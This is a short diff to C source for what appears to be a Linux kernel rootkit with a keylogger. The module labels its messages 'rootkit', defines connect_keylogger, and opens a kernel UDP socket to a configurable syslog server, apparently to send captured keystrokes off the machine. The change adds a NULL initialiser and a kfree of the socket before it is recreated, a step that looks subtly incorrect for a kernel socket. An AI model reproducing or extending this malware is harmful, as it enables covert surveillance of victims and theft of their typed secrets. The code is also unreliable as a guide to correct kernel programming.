@@ -12,7 +12,7 @@ MODULE_PARM_DESC(syslog_ip, "IP of the syslog server");
 
 int enabled = 1;
 
-struct socket* syslog_sock;
+struct socket* syslog_sock = NULL;
 struct sockaddr_in syslog_addr;
 char* msg_template = "<12>1 - - rootkit - - - ";
 
@@ -66,6 +66,8 @@ void connect_keylogger(char* ip_str)
   int err;
   u8 ip[4];
   const char* end;
+
+  kfree(syslog_sock);
 
   // Create the socket
   err = sock_create_kern(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &syslog_sock);
